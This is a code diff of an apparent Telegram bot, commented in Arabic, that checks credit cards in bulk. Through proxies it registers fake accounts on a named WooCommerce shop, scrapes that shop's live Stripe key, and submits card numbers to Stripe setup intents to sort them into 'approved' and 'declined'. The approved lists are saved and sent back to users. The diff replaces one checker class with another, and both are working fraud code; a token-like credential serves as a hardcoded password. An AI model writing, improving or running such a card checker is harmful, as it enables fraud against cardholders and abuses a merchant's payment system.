@@ -8,6 +8,7 @@
 
 import os
 import re
+import sys
 import time
 import random
 import logging
@@ -79,114 +80,88 @@ def clear_state(uid: int):
     with states_lock:
         check_states.pop(uid, None)
 
-# ==================== Stripe Auth Checker (كل بطاقة بسشن جديد) ====================
-class StripeAuthChecker:
-    SITE = "analyticorange.com"
-    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
-    PAYMENT_UA = "stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent"
+# ==================== استيراد فئة الفحص من ssr.py (مباشرة) ====================
+# نعيد تعريف الفئة هنا مع إضافة البروكسي
+class Stroxr:
+    def __init__(self):
+        self.url = 'analyticorange.com'
+        self.email = f"userrjapbx{random.randint(1000,9999)}@gmail.com"
+        self.payment_user_agent = 'stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
+        self.headers = {
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
 
-    def _create_session(self) -> requests.Session:
-        """إنشاء سشن جديد مع بروكسي"""
+    def _get_session(self):
         s = requests.Session()
         s.proxies.update(PROXIES)
-        s.headers.update({
-            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": '"Android"',
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": self.UA,
-        })
+        s.headers.update(self.headers)
         return s
 
-    def _register(self, session: requests.Session) -> Optional[requests.Session]:
-        """تسجيل مستخدم جديد"""
-        try:
-            email = f"usr{random.randint(10000, 99999)}{random.randint(10, 99)}@gmail.com"
-            resp = session.get(f"https://{self.SITE}/my-account/", timeout=20)
-            nonce = resp.text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
+    def Regester(self):
+        r = self._get_session()
+        r1 = r.get(url=f'https://{self.url}/my-account/', timeout=20).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
+        r.post(url=f'https://{self.url}/my-account/', timeout=20, data={
+            'email': self.email,
+            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',
+            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+            'woocommerce-register-nonce': r1,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        })
+        return r
 
-            session.post(f"https://{self.SITE}/my-account/", data={
-                "email": email,
-                "password": "7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y",
-                "wc_order_attribution_user_agent": self.UA,
-                "woocommerce-register-nonce": nonce,
-                "_wp_http_referer": "/my-account/",
-                "register": "Register",
-            }, timeout=20)
-            return session
-        except Exception as e:
-            logger.error(f"Registration error: {e}")
-            return None
-
-    def check(self, cc: str) -> tuple:
-        """
-        فحص بطاقة واحدة
-        يعيد: (result: str, elapsed: float, response_msg: str)
-        """
-        start_time = time.time()
-        cc = cc.strip()
-        parts = cc.split("|")
-        if len(parts) < 4:
-            return "INVALID", 0, "Invalid format"
-
-        n, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3].strip()
+    def Paymnt(self, ccx):
+        ccx = ccx.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3].strip()
         if "20" in yy:
             yy = yy.split("20")[1]
 
-        for attempt in range(3):
+        ss = self.Regester()
+        r3 = ss.get(f'https://{self.url}/my-account/add-payment-method/', timeout=20).text
+        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r3).group(1)
+        addnonce = r3.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent={self.payment_user_agent}&key={pk_live}'
+        r4 = ss.post('https://api.stripe.com/v1/payment_methods', timeout=20, data=data).json()
+        idi = r4['id']
+
+        r5r = ss.post(f'https://{self.url}/wp-admin/admin-ajax.php', timeout=20, data={
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': idi,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': addnonce,
+        })
+        r5 = r5r.text
+
+        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
+            return 'Declined', r5[:80]
+        elif 'success' in r5 or 'Success' in r5:
+            return 'Approved', r5[:80]
+        elif 'Your card number is incorrect.' in r5:
+            return 'Invalid Card', r5[:80]
+        else:
             try:
-                session = self._create_session()
-                session = self._register(session)
-                if not session:
-                    continue
+                return r5r.json()['data']['error']['message'], r5[:80]
+            except:
+                return 'Error', r5[:80]
 
-                # جلب صفحة الدفع
-                page = session.get(f"https://{self.SITE}/my-account/add-payment-method/", timeout=20).text
-
-                pk_live = re.search(r"(pk_live_[A-Za-z0-9_-]+)", page).group(1)
-                add_nonce = page.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
-
-                # إنشاء PaymentMethod
-                pm_data = f"type=card&card[number]={n}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent={self.PAYMENT_UA}&key={pk_live}"
-                pm_resp = session.post("https://api.stripe.com/v1/payment_methods", data=pm_data, timeout=20).json()
-
-                if "error" in pm_resp:
-                    error_msg = pm_resp["error"].get("message", "Card Error")
-                    return "DECLINED", time.time() - start_time, error_msg
-
-                pm_id = pm_resp["id"]
-
-                # تأكيد Setup Intent
-                r5 = session.post(f"https://{self.SITE}/wp-admin/admin-ajax.php", data={
-                    "action": "wc_stripe_create_and_confirm_setup_intent",
-                    "wc-stripe-payment-method": pm_id,
-                    "wc-stripe-payment-type": "card",
-                    "_ajax_nonce": add_nonce,
-                }, timeout=20).text
-
-                elapsed = time.time() - start_time
-
-                if "Your card was declined" in r5 or "could not be set up" in r5:
-                    return "DECLINED", elapsed, "Card declined"
-                elif "success" in r5.lower():
-                    return "APPROVED", elapsed, "Approved - Card is live"
-                elif "insufficient" in r5.lower():
-                    return "LIVE", elapsed, "Insufficient funds (Live card)"
-                elif "cvv" in r5.lower():
-                    return "LIVE", elapsed, "CVV failure (Live card)"
-                else:
-                    return "DECLINED", elapsed, r5[:80]
-
-            except Exception as e:
-                logger.warning(f"Attempt {attempt + 1} failed: {e}")
-                time.sleep(0.5)
-                continue
-
-        return "ERROR", time.time() - start_time, "All attempts failed"
+    def check(self, cc):
+        """ترجع (status, raw_response)"""
+        try:
+            return self.Paymnt(cc)
+        except Exception as e:
+            return 'Error', str(e)
 
 # ==================== BIN Info ====================
 _BIN_CACHE = {}
@@ -210,7 +185,6 @@ def get_bin_info(bin6: str) -> dict:
         return {"brand": "?", "type": "?", "level": "?", "bank": "?", "country": "?", "flag": "🏳️"}
 
 def mask_card(cc: str) -> str:
-    """تخفي الأرقام الحساسة"""
     try:
         parts = cc.split("|")
         num = parts[0]
@@ -228,10 +202,10 @@ def progress_bar(current: int, total: int, width: int = 12) -> str:
     filled = int(width * current / total)
     return "█" * filled + "░" * (width - filled)
 
-def is_hit(result: str) -> bool:
-    return result in ["APPROVED", "LIVE"]
+def is_hit(status: str) -> bool:
+    return "Approved" in status or "approved" in status.lower()
 
-# ==================== لوحات المفاتيح الاحترافية ====================
+# ==================== لوحات المفاتيح ====================
 def main_keyboard() -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup(row_width=2)
     markup.row(
@@ -257,52 +231,35 @@ def home_keyboard() -> InlineKeyboardMarkup:
     markup.add(InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=ICONS["back"]))
     return markup
 
-def progress_keyboard(current: int, total: int, approved: int, declined: int, response: str, elapsed: float, is_running: bool = True) -> InlineKeyboardMarkup:
-    """شاشة التقدم - كل شيء على شكل أزرار احترافية"""
+def progress_keyboard(current: int, total: int, approved: int, declined: int, status: str, elapsed: float, is_running: bool = True) -> InlineKeyboardMarkup:
     percent = int(current / total * 100) if total else 0
     bar = progress_bar(current, total)
 
     markup = InlineKeyboardMarkup(row_width=2)
-
-    # شريط التقدم
     markup.add(InlineKeyboardButton(f"📊 {bar} {percent}% ({current}/{total})", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))
-
-    # الإحصائيات
     markup.row(
         InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="ignore", style="success", icon_custom_emoji_id=ICONS["approve"]),
         InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="ignore", style="danger", icon_custom_emoji_id=ICONS["decline"]),
     )
-
-    # آخر رد
-    markup.add(InlineKeyboardButton(f"📝 {response[:45]}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
-
-    # الزمن
+    markup.add(InlineKeyboardButton(f"📝 {status[:45]}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
     markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))
-
-    # زر الإيقاف
     if is_running:
         markup.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]))
-
     return markup
 
-def result_keyboard(cc: str, result: str, elapsed: float, bin_info: dict, is_hit_card: bool) -> InlineKeyboardMarkup:
-    """نتيجة البطاقة - أزرار احترافية"""
+def result_keyboard(cc: str, status: str, elapsed: float, bin_info: dict, is_hit_card: bool) -> InlineKeyboardMarkup:
     style = "success" if is_hit_card else "danger"
     icon = ICONS["approve"] if is_hit_card else ICONS["decline"]
-
     markup = InlineKeyboardMarkup(row_width=1)
-
     markup.add(InlineKeyboardButton(f"💳 {cc}", callback_data="ignore", style=style, icon_custom_emoji_id=icon))
-    markup.add(InlineKeyboardButton(f"📝 {result}", callback_data="ignore", style=style, icon_custom_emoji_id=ICONS["gate"]))
+    markup.add(InlineKeyboardButton(f"📝 {status[:50]}", callback_data="ignore", style=style, icon_custom_emoji_id=ICONS["gate"]))
     markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))
     markup.add(InlineKeyboardButton(f"🏦 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["auth"]))
     markup.add(InlineKeyboardButton(f"🏛 {bin_info['bank']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
     markup.add(InlineKeyboardButton(f"🌍 {bin_info['country']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))
     markup.add(InlineKeyboardButton(f"🏷 {CREDITS}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["back"]))
-
     return markup
 
-# ==================== واجهة الترحيب ====================
 def welcome_text(name: str) -> str:
     return f"""
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -334,7 +291,6 @@ def cmd_start_or_chk(message):
             bot.send_message(message.chat.id, welcome_text(name), parse_mode="HTML", reply_markup=main_keyboard())
         return
 
-    # معالجة /chk
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2 or "|" not in parts[1]:
         bot.reply_to(message, "❌ الصيغة: <code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")
@@ -344,14 +300,16 @@ def cmd_start_or_chk(message):
     prog_msg = bot.reply_to(message, f"🔄 <b>جاري الفحص...</b>\n<code>{mask_card(cc)}</code>", parse_mode="HTML")
 
     def do_check():
-        checker = StripeAuthChecker()
-        status, elapsed, response = checker.check(cc)
+        start = time.time()
+        checker = Stroxr()
+        status, raw = checker.check(cc)
+        elapsed = time.time() - start
         bin6 = cc.split("|")[0][:6]
         bin_info = get_bin_info(bin6)
         hit = is_hit(status)
 
-        final_text = f"<b>{'✅ APPROVED' if hit else '❌ DECLINED'}</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {response}\n⏱ {elapsed:.2f}s"
-        keyboard = result_keyboard(mask_card(cc), response, elapsed, bin_info, hit)
+        final_text = f"<b>{'✅ APPROVED' if hit else '❌ DECLINED'}</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {status}\n⏱ {elapsed:.2f}s"
+        keyboard = result_keyboard(mask_card(cc), status, elapsed, bin_info, hit)
 
         try:
             bot.edit_message_text(final_text, prog_msg.chat.id, prog_msg.message_id, parse_mode="HTML", reply_markup=keyboard)
@@ -398,7 +356,6 @@ def handle_combo(message):
     threading.Thread(target=run_combo, args=(uid, message.chat.id, prog_msg.message_id, lines), daemon=True).start()
 
 def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
-    """تنفيذ الفحص الكومبو - كل بطاقة بسشن جديد"""
     total = len(cards)
     approved = 0
     declined = 0
@@ -406,15 +363,16 @@ def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
     declined_list = []
 
     set_state(uid, {"running": True, "approved": approved_list, "declined": declined_list, "total": total})
-    checker = StripeAuthChecker()
+    checker = Stroxr()
 
     for i, cc in enumerate(cards, 1):
         state = get_state(uid)
         if not state.get("running"):
             break
 
-        # فحص البطاقة بسشن جديد
-        status, elapsed, response = checker.check(cc)
+        start = time.time()
+        status, raw = checker.check(cc)
+        elapsed = time.time() - start
         bin6 = cc.split("|")[0][:6]
         bin_info = get_bin_info(bin6)
         hit = is_hit(status)
@@ -422,28 +380,24 @@ def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
         if hit:
             approved += 1
             approved_list.append(cc)
-            # إرسال نتيجة الموافقة
-            bot.send_message(chat_id, f"✅ <b>APPROVED</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {response}\n⏱ {elapsed:.2f}s", parse_mode="HTML", reply_markup=result_keyboard(mask_card(cc), response, elapsed, bin_info, True))
+            bot.send_message(chat_id, f"✅ <b>APPROVED</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {status}\n⏱ {elapsed:.2f}s", parse_mode="HTML", reply_markup=result_keyboard(mask_card(cc), status, elapsed, bin_info, True))
         else:
             declined += 1
             declined_list.append(cc)
 
-        # تحديث شاشة التقدم
         try:
-            prog_keyboard = progress_keyboard(i, total, approved, declined, response[:40], elapsed, state.get("running", True))
+            prog_keyboard = progress_keyboard(i, total, approved, declined, status[:40], elapsed, state.get("running", True))
             bot.edit_message_text("", chat_id, msg_id, reply_markup=prog_keyboard)
         except:
             pass
 
         time.sleep(0.5)
 
-    # حفظ النتائج
     if approved_list:
         (RESULTS_DIR / f"{uid}_approved.txt").write_text("\n".join(approved_list), encoding="utf-8")
     if declined_list:
         (RESULTS_DIR / f"{uid}_declined.txt").write_text("\n".join(declined_list), encoding="utf-8")
 
-    # إرسال الملخص والملفات
     final_text = f"━━━━━━━━━━━━━━━━━━\n✅ تم الانتهاء\n━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: {total}\n✅ Approved: {approved}\n❌ Declined: {declined}\n━━━━━━━━━━━━━━━━━━\n💫 {BOT_TAG}"
     bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="HTML", reply_markup=home_keyboard())
 
@@ -453,7 +407,7 @@ def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
 
     clear_state(uid)
 
-# ==================== أوامر وأزرار إضافية ====================
+# ==================== أوامر وأزرار ====================
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
     uid = message.from_user.id
